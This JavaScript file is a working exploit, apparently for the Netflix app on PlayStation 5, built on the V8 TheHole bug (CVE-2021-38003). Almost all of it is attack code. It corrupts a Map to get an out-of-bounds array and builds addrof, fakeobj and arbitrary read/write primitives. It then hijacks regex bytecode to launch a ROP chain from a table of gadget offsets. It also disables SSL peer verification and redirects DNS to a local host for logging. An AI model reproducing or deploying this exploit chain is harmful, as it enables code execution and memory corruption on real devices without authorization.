// Netflix PS5 Exploit
// based on https://starlabs.sg/blog/2022/12-the-hole-new-world-how-a-small-leak-will-sink-a-great-browser-cve-2021-38003/
// thanks to Gezines y2jb for advice and reference : https://github.com/Gezine/Y2JB/blob/main/download0/cache/splash_screen/aHR0cHM6Ly93d3cueW91dHViZS5jb20vdHY%3D/splash.html

// #region WebSocket
const ws = {
    socket: null,
    init(ip, port, callback) {
        nrdp.gibbon._runConsole("/command ssl-peer-verification false");

        nrdp.dns.set("pwn.netflix.com", nrdp.dns.A, {
            addresses: [ip],
            ttl: 3600000
        });

        this.socket = new nrdp.WebSocket(`wss://pwn.netflix.com:${port}`);
        this.socket.onopen = callback;
    },
    send(msg) {
        if (this.socket && this.socket.readyState !== this.socket.CLOSED) {
            this.socket.send(msg);
        }
    }
}
// #endregion
// #region Logger
const logger = {
    overlay: null,
    lines: [],
    maxLines: 40,
    refreshTimer: null,
    init() {
        this.overlay = nrdp.gibbon.makeWidget({
            name: "dbg",
            width: 1280,
            height: 720,
            backgroundColor: "#000000"
        });
    
        nrdp.gibbon.scene.overlay = this.overlay;
    },
    log(msg) {
        ws.send(msg);
        this.lines.push(msg);
        if (this.lines.length > this.maxLines) this.lines.shift();
        if (this.refreshTimer) nrdp.clearTimeout(this.refreshTimer);
        this.refreshTimer = nrdp.setTimeout(() => {
            this.refresh();
            this.refreshTimer = null;
        }, 50);
    },
    refresh() {
        if (!this.overlay) return;
        if (this.overlay.children) {
            for (var j = this.overlay.children.length - 1; j >= 0; j--) {
                var child = this.overlay.children[j];
                if (child && child._name && child._name.startsWith("ln")) {
                    this.overlay.removeChild(child);
                }
            }
        }

        for (var i = 0; i < this.lines.length; i++) {
            var w = nrdp.gibbon.makeWidget({
                name: "ln" + i,
                x: 10,
                y: 10 + (i * 17),
                width: 1260,
                height: 15
            });
            
            w.text = {
                contents: this.lines[i],
                size: 12,
                color: {
                    a: 255,
                    r: 0,
                    g: 255,
                    b: 0
                },
                wrap: false
            };

            w.parent = this.overlay;
        }
    }
}
// #endregion
// #region Pointer Helpers
const buf = new ArrayBuffer(8);
const view = new DataView(buf);
const ptr = {
    il2ih(value) {
        return value << 0x20n;
    },
    ih2il(value) {
        return value >> 0x20n;
    },
    ih(value) {
        return value & ~0xFFFFFFFFn;
    },
    il(value) {
        return value & 0xFFFFFFFFn;
    },
    itag(value) {
    	return value | 1n;
    },
    iuntag(value) {
    	return value & ~1n;
    },
    f2i(value) {
        view.setFloat64(0, value, true);
        return view.getBigUint64(0, true);
    },
    f2ih(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(4, true));
    },
    f2il(value) {
        view.setFloat64(0, value, true);
        return BigInt(view.getUint32(0, true));
    },
    i2f(value) {
        view.setBigUint64(0, value, true);
        return view.getFloat64(0, true);
    },
    i2h(value, padded = true) {
        let str = value.toString(16).toUpperCase();
        if (padded) {
            str = str.padStart(16, '0');
        }
        return `0x${str}`;
    }
}
// #endregion
// #region Primitives
let map, oob_arr, flt_arr, obj_arr;
const rw = {
    flt_elem_index: 7,
    obj_elem_index: 14,
    flt_elem: 0,
    obj_elem: 0,
    init() {
        let hole = this.make_hole();

        map = new Map();
        map.set(1, 1);
        map.set(hole, 1);
        map.delete(hole);
        map.delete(hole);
        map.delete(1);

        oob_arr = new Array(1.1, 1.1);
        flt_arr = [2.2];
        obj_arr = [{}];

        logger.log(`OOB array length: ${oob_arr.length}`);

        map.set(0x10, -1);
        map.set(oob_arr, 0x100);

        logger.log("Achieved OOB !!");

        logger.log(`OOB array length: ${oob_arr.length}`);

        this.flt_elem = ptr.f2i(oob_arr[this.flt_elem_index]);
        this.obj_elem = ptr.f2i(oob_arr[this.obj_elem_index]);
    },
    addrof(obj) {
        oob_arr[this.obj_elem_index] = ptr.i2f(this.obj_elem);
        obj_arr[0] = obj;
        oob_arr[this.flt_elem_index] = ptr.i2f(this.obj_elem);
        return ptr.iuntag(ptr.f2il(flt_arr[0]));
    },
    fakeobj(addr) {
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(ptr.itag(addr)));
        oob_arr[this.obj_elem_index] = ptr.i2f(this.flt_elem);
        return obj_arr[0];
    },
    read(addr, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        let value = ptr.f2i(flt_arr[0]);
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        return untag ? ptr.iuntag(value) : value;
    },
    write(addr, value, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        flt_arr[0] = ptr.i2f(untag ? ptr.iuntag(value) : value);
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
    },
    read32(addr, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        let value = ptr.il(ptr.f2i(flt_arr[0]));
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
        return untag ? ptr.iuntag(value) : value;
    },
    write32(addr, value, untag = false) {
        oob_arr[this.flt_elem_index] = ptr.i2f(ptr.ih(this.flt_elem) | ptr.il(ptr.itag(addr) - 8n));
        flt_arr[0] = ptr.i2f(ptr.ih(ptr.f2i(flt_arr[0])) | ptr.il(untag ? ptr.iuntag(value) : value));
        oob_arr[this.flt_elem_index] = ptr.i2f(this.flt_elem);
    },
    make_hole() {
        let v1;
        function f0(v4) {
            v4(() => { }, v5 => {
                v1 = v5.errors;
            });
        }
        f0.resolve = function (v6) {
            return v6;
        };
        let v3 = {
            then(v7, v8) {
                v8();
            }
        };
        Promise.any.call(f0, [v3]);
        return v1[1];
    },
    make_hole_old() {
        let a = [], b = [];
        let s = '"'.repeat(0x800000);
        a[20000] = s;

        for (let i = 0; i < 10; i++) a[i] = s;
        for (let i = 0; i < 10; i++) b[i] = a;

        try {
            JSON.stringify(b);
        } catch (hole) {
            return hole;
        }
    
        throw new Error('Could not trigger TheHole');
    }
}
// #endregion
// #region Arbitrary Primitives
let lo_arr, lo_view;
const arw = {
    isolate: 0n,
    fake_buf_addr: 0n,
    fake_view_addr: 0n,
    fake_buf_index: 0x10,
    fake_view_index: 0x20,
    lo_arr_data_ptr_addr: 0n,
    lo_arr_backing_store_addr: 0n,
    init() {
        let arr = new Uint8Array(0x40);
        let arr_addr = rw.addrof(arr);

        this.isolate = ptr.ih(rw.read(arr_addr + 0x28n));

        if (this.isolate == 0n) {
            throw new Error("Isolate is zero, exiting...");
        }
        
        lo_arr = new Array(0x20001);
        lo_view = new DataView(new ArrayBuffer(8));

        lo_arr_addr = rw.addrof(lo_arr);
        lo_view_addr = rw.addrof(lo_view);
        lo_view_buf_addr = rw.addrof(lo_view.buffer);

        this.lo_arr_backing_store_addr = rw.read32(lo_arr_addr + 0x8n, true);
        this.lo_arr_data_ptr_addr = this.lo_arr_backing_store_addr + 0x8n;

        rw.write(lo_view_addr + 0x18n, 0x20001n);
        rw.write(lo_view_buf_addr + 0x14n, this.lo_arr_data_ptr_addr + this.isolate);

        this.make_fake_buf();
        this.make_fake_view();

        logger.log("Achieved ARW !!");

        let fake_view = this.fakeobj(this.fake_view_addr);

        logger.log(`fake view length: ${fake_view.byteLength}`);
    },
    addrof(obj) {
        lo_arr[0] = obj;
        return ptr.iuntag(BigInt(lo_view.getUint32(0, true)));
    },
    fakeobj(addr) {
        lo_view.setUint32(0, Number(ptr.itag(ptr.il(addr))), true);
        return lo_arr[0];
    },
    read(addr, untag = false) {
        let value = arw.view(addr).getBigUint64(0, true);
        return untag ? ptr.iuntag(value) : value;
    },
    write(addr, value, untag = false) {
        arw.view(addr).setBigUint64(0, untag ? ptr.iuntag(value) : value, true);
    },
    read32(addr, untag = false) {
        let value = BigInt(arw.view(addr).getUint32(0, true));
        return untag ? ptr.iuntag(value) : value;
    },
    write32(addr, value, untag = false) {
        arw.view(addr).setUint32(0, Number(untag ? ptr.iuntag(value) : value), true);
    },
    /** @return {DataView<ArrayBuffer>} */
    view(addr, offset = 0n, size = -1n, isolated = true) {
        lo_view.setBigUint64((4 * this.fake_buf_index) + 0x14, ptr.iuntag(isolated ? addr + this.isolate : addr), true);
        lo_view.setBigUint64((4 * this.fake_view_index) + 0x10, BigInt(offset), true);
        lo_view.setBigUint64((4 * this.fake_view_index) + 0x18, BigInt(size), true);
        return this.fakeobj(this.fake_view_addr);
    },
    make_fake_buf() {
        let buf = new ArrayBuffer(8);
        let buf_addr = this.addrof(buf);
        
        let i = this.fake_buf_index;
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr)), true);
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x4n)), true);
        lo_view.setUint32(4 * i++, Number(rw.read32(buf_addr + 0x8n)), true);
        lo_view.setBigUint64(4 * i++, 0x1000n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true); // backing_store
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setUint32(4 * i++, 2, true);
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++

        this.fake_buf_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_buf_index);
    },
    make_fake_view() {
        let buf = this.fakeobj(this.fake_buf_addr);

        let view = new DataView(buf);
        let view_addr = this.addrof(view);

        let i = this.fake_view_index;
        lo_view.setUint32(4 * i++, Number(rw.read32(view_addr)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x4n)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0x8n)), true);
        lo_view.setUint32(4 * i++,  Number(rw.read32(view_addr + 0xCn)), true);
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, -1n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;
        lo_view.setBigUint64(4 * i++, 0n, true);
        i++;

        this.fake_view_addr = this.lo_arr_data_ptr_addr + BigInt(4 * this.fake_view_index);
    }
}
// #endregion
// #region ROP
const rop = {
    base_addr: 0n,
    rop_insert_index: 9,
    rop_insts: [],
    gadgets: Object.freeze({
        RET:                                            0x0000000000000042n, // ret
        POP_R10_RET:                                    0x000000000017F2F7n, // pop r10 ; ret
        POP_R12_RET:                                    0x000000000033881cn, // pop r12 ; ret
        POP_R13_RET:                                    0x00000000001874BFn, // pop r13 ; ret
        POP_R14_RET:                                    0x00000000001FA6D5n, // pop r14 ; ret
        POP_R15_RET:                                    0x000000000024F3C1n, // pop r15 ; ret
        POP_R8_RET:                                     0x000000000006C232n, // pop r8 ; ret
        POP_R9_RET:                                     0x000000000066511Bn, // pop r9 ; ret
        POP_RAX_RET:                                    0x000000000006C233n, // pop rax ; ret
        POP_RBP_RET:                                    0x0000000000000079n, // pop rbp ; ret
        POP_RBX_RET:                                    0x000000000002E1EBn, // pop rbx ; ret
        POP_RCX_RET:                                    0x0000000000002485n, // pop rcx ; ret
        POP_RDI_RET:                                    0x00000000001A729Bn, // pop rdi ; ret
        POP_RDX_RET:                                    0x000000000003EC42n, // pop rdx ; ret
        POP_RSI_RET:                                    0x00000000000014D8n, // pop rsi ; ret
        POP_RSP_RET:                                    0x00000000001DF1E1n, // pop rsp ; ret
        INT3_RET:                                       0x0000000000178AC4n, // int3 ; ret
        PUSH_RBP_MOV_RBP_RSP_MOV_RAX_RBP_POP_RBP_RET:   0x000000000024F2D2n, // push rbp ; mov rbp, rsp ; mov rax, rbp ; pop rbp ; ret
        MOV_RAX_RBP_POP_RBP_RET:                        0x000000000024F2D6n, // mov rax, rbp ; pop rbp ; ret
        POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET:               0x0000000000801819n, // pop rcx ; add rsp, rbx ; push rcx ; ret
        MOV_RAX_QWORD_PTR_RDX_RET:                      0x00000000002EE490n, // mov rax, qword ptr [rdx] ; ret
        MOV_QWORD_PTR_RDX_RAX_RET:                      0x000000000130F185n, // mov qword ptr [rdx], rax ; ret
        ADD_RAX_18_RET:                                 0x000000000041D46An  // add rax, 0x18 ; ret
    }),
    init() {
        this.impl.init();
        this.stack.init();

        this.base_addr = arw.view(0n).getBigUint64(0x28, true) - 0x8966C8n;
        logger.log(`base_addr: ${ptr.i2h(this.base_addr)}`);

        this.rop_insts = [
            "ADD_RAX_18_RET",
            "POP_RDX_RET",
            this.stack.store_addr,
            "MOV_QWORD_PTR_RDX_RAX_RET",
            "MOV_RAX_RBP_POP_RBP_RET",
            0n,
            "POP_RDX_RET",
            this.stack.store_addr + 8n,
            "MOV_QWORD_PTR_RDX_RAX_RET",
            // <-- insert ROP here
            "POP_RDX_RET",
            this.stack.store_addr,
            "MOV_RAX_QWORD_PTR_RDX_RET",
            "POP_RDX_RET",
            0,
            "MOV_QWORD_PTR_RDX_RAX_RET",
            "POP_RDX_RET",
            this.stack.store_addr + 8n,
            "MOV_RAX_QWORD_PTR_RDX_RET",
            "POP_RDX_RET",
            0,
            "MOV_QWORD_PTR_RDX_RAX_RET",
            "POP_RBP_RET",
            1,
            "POP_RAX_RET",
            0n,
            "POP_RBX_RET",
            -0x20n,
            "POP_RSP_RET",
            1
        ];
    },
    /** @param {string} name */
    gadget(name) {
        let value;
        if (name in this.gadgets) {
            value = this.gadgets[name];
        }
        if (this.base_addr != 0n) {
            value += this.base_addr;
        }
        return value;
    },
    /** @param {Array} insts */
    exec(insts) {
        let rop_insts = this.rop_insts.slice(0);
        rop_insts = rop_insts.slice(0, this.rop_insert_index).concat(insts).concat(rop_insts.slice(this.rop_insert_index));

        this.stack.reset();
        this.stack.push(rop_insts);
        
        this.impl.store_return();
        this.impl.gadget_current("PUSH_RBP_MOV_RBP_RSP_MOV_RAX_RBP_POP_RBP_RET");
        this.impl.gadget_current("POP_RSP_RET");
        this.impl.set64_current(this.stack.inst_addr);
        this.impl.gadget_current("POP_RCX_ADD_RSP_RBX_PUSH_RCX_RET");
        this.impl.restore_return();

        this.impl.exec();
    },
    stack: {
        offset: 0,
        fake_index: 0x1000,
        fake_size: 0x1000,
        store_offset: 0,
        inst_offset: 0,
        store_addr: 0n,
        inst_addr: 0n,
        init() {
            this.store_offset = 0;
            this.inst_offset = this.fake_size / 2;
            this.store_addr = arw.lo_arr_data_ptr_addr + arw.isolate + BigInt(4 * this.fake_index);
            this.inst_addr = this.store_addr + BigInt(this.inst_offset);
        },
        /** @return {DataView<ArrayBuffer>} */
        view() {
            return arw.view(this.store_addr, 0n, BigInt(this.fake_size), false);
        },
        /**
         * @param {number} index 
         * @return {BigInt} 
        */
        get(index) {
            return this.view().getBigUint64(this.store_offset + (8 * index), true);
        },
        /**
         * @param {number} index
         * @param {BigInt} value
         * @return {BigInt} 
        */
        set(index, value) {
            return this.view().setBigUint64(this.store_offset + (8 * index), value, true);
        },
        /** @param {Array} insts */
        push(insts) {
            let value;
            let offset;
            let offsets = [];
            for (var i = 0; i < insts.length; i++) {
                value = 0n,
                offset = this.offset;

                let inst = insts[i];
                switch (typeof inst) {
                    case "string":
                        value = rop.gadget(inst);
                        break;
                    case "number":
                        switch(inst) {
                            case 0:
                                value = 0n;
                                offsets.push(offset);
                                break;
                            case 1:
                                value = this.inst_addr + BigInt(offset);
                                offset = offsets.pop();
                                break;
                        }
                        break;
                    case "bigint":
                        value = inst;
                        break;
                }

                this.view().setBigUint64(this.inst_offset + offset, value, true);
                this.offset += 8;
            }
        },
        reset() {
            for (var i = 0; i < this.fake_size; i += 8) {
                this.view().setBigUint64(i, 0n, true);
            }

            this.offset = 0;
        }
    },
    impl: {
        reg: 0,
        offset: 0,
        return_reg: 0x52,
        return_store_reg: 3,
        temp_store_reg: 5,
        latin1_bytecode: 0n,
        /** @type {string} */
        str: "aaaaa",
        /** @type {Regex} */
        regex: /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g,
        bytecode: Object.freeze({
            BREAK: 0,
            PUSH_CP: 1,
            PUSH_BT: 2,
            PUSH_REGISTER: 3,
            SET_REGISTER_TO_CP: 4,
            SET_CP_TO_REGISTER: 5,
            SET_REGISTER_TO_SP: 6,
            SET_SP_TO_REGISTER: 7,
            SET_REGISTER: 8,
            ADVANCE_REGISTER: 9,
            POP_CP: 10,
            POP_BT: 11,
            POP_REGISTER: 12,
            FAIL: 13,
            SUCCEED: 14,
            ADVANCE_CP: 15
        }),
        init() {
            let addr_regex = arw.addrof(this.regex);

            logger.log(`addr_regex: ${ptr.i2h(addr_regex)}`);

            let data_addr = arw.read32(addr_regex + 0xCn, true);

            logger.log(`data_addr: ${ptr.i2h(data_addr)}`);

            //arw.write32(data_addr + 0x30n, -1n << 1n);

            this.regex.exec(this.str);

            this.latin1_bytecode = arw.read32(data_addr + 0x1Cn, true);

            logger.log(`latin1_bytecode: ${ptr.i2h(this.latin1_bytecode)}`);

            this.reset();
        },
        /** @param {BigInt} value */
        emit32(value) {
            arw.view(this.latin1_bytecode).setUint32(0x8 + this.offset, Number(value), true);
            this.offset += 4;
        },
        /** 
         * @param {number} op 
         * @param {number} reg
        */
        emit_reg(op, reg) {
            this.emit32((reg << 8) | op);
        },
        reset() {
            this.reg = this.return_reg;
            this.offset = 0;
        },
        /** 
         * @param {number} reg 
         * @param {BigInt} value
        */
        adv(reg, value) {
            this.emit_reg(this.bytecode.ADVANCE_REGISTER, reg);
            this.emit32(value);
        },
        /** 
         * @param {number} reg
         * @param {BigInt} value
        */
        set(reg, value) {
            this.emit_reg(this.bytecode.SET_REGISTER, reg);
            this.emit32(value);
        },
        /** 
         * @param {number} src
         * @param {number} dst
        */
        mov(src, dst) {
            this.emit_reg(this.bytecode.PUSH_REGISTER, src);
            this.emit_reg(this.bytecode.POP_REGISTER, dst);
        },
        /** 
         * @param {number} reg
         * @param {BigInt} value
        */
        adv64(reg, value) {
            this.adv(reg, ptr.il(value));
            this.adv(reg + 1, ptr.ih2il(value));
        },
        /** 
         * @param {number} reg
         * @param {BigInt} value
        */
        set64(reg, value) {
            this.set(reg, ptr.il(value));
            this.set(reg + 1, ptr.ih2il(value));
        },
        /** 
         * @param {number} src
         * @param {number} dst
        */
        mov64(src, dst) {
            this.mov(src, dst);
            this.mov(src + 1, dst + 1);
        },
        /** @param {BigInt} value */
        adv_current(value) { 
            this.adv(this.reg++, value); 
        },
        /** @param {BigInt} value */
        set_current(value) { 
            this.set(this.reg++, value); 
        },
        /** @param {number} reg */
        mov_from_current(reg) { 
            this.mov(this.reg++, reg); 
        },
        /** @param {number} reg */
        mov_to_current(reg) {
            this.mov(reg, this.reg++);
        },
        /** @param {BigInt} value */
        adv64_current(value) { 
            this.adv64(this.reg, value);
            this.reg += 2;
        },
        /** @param {BigInt} value */
        set64_current(value) { 
            this.set64(this.reg, value);
            this.reg += 2;
        },
        /** @param {number} reg */
        mov64_from_current(reg) { 
            this.mov64(this.reg, reg); 
            this.reg += 2;
        },
        /** @param {number} reg */
        mov64_to_current(reg) { 
            this.mov64(reg, this.reg);
            this.reg += 2;
        },
        /** @param {BigInt} addr */
        gadget_current(name) {
            this.set64(this.temp_store_reg, rop.gadget(name));
            this.mov64_to_current(this.temp_store_reg);
        },
        store_return() {
            this.mov64(this.return_reg, this.return_store_reg);
        },
        restore_return() {
            this.mov64_to_current(this.return_store_reg);
        },
        exec() {
            this.emit32(this.bytecode.FAIL);

            this.regex.exec(this.str);

            this.reset();
        }
    }
}
// #endregion

function main() {
    try {
        logger.init();
        logger.log("=== Netflix n Hack ===");

        rw.init();
        arw.init();
        rop.init();

        rop.exec([]);

        logger.log("done");

        //while (true) {}
    } catch(e) {
        logger.log(e.message);
        logger.log(e.stack);
    }
}

nrdp.gibbon.garbageCollect();
ws.init("192.168.1.2", 1337, main);
//main();